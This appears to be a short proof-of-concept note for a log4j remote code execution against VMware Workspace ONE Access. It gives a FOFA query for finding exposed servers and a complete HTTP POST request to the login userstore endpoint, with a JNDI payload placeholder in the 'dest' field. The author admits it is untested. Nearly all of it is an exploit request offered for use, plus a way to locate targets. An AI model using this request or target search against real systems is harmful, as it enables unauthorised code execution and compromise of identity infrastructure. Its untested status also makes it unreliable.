# VMWare Workspace One log4j RCE

## fofa

```
app="vmware-Workspace-ONE-Access"
```

## Poc

```
POST /SAAS/auth/login/userstore HTTP/1.1
Host: <TARGET>
Cookie: JSESSIONID=FD571A97DE36B94D85627EDD88B9E6A4
Content-Length: 457
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: <TARGET>
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: https://<TARGET>/SAAS/auth/login/embeddedauthbroker/callback
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

isJavascriptEnabled=&areCookiesEnabled=&dest=<JNDI Payload>&useragent=&userInput=&workspaceId=&groupUuidsStr=&isWindows10EnrollmentFlow=false&username=joe&userStoreDomain=&remember=true&userStoreFormSubmit=
```

I have not tested it, If anyone confirm it, Please contribute the test screenshot.
